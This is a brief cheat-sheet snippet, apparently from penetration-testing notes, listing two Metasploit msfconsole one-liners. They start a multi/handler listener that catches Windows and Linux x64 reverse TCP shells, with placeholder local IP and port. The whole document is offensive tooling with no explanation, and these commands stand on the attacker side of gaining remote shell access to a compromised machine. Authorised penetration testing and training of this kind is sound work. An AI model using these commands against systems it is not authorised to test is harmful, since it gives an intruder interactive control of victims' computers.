> Windows:

```
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set lhost 192.168.x.x; set lport <port>; run"
```

> Linux:

```
sudo msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost 192.168.x.x; set lport <port>; run"
```
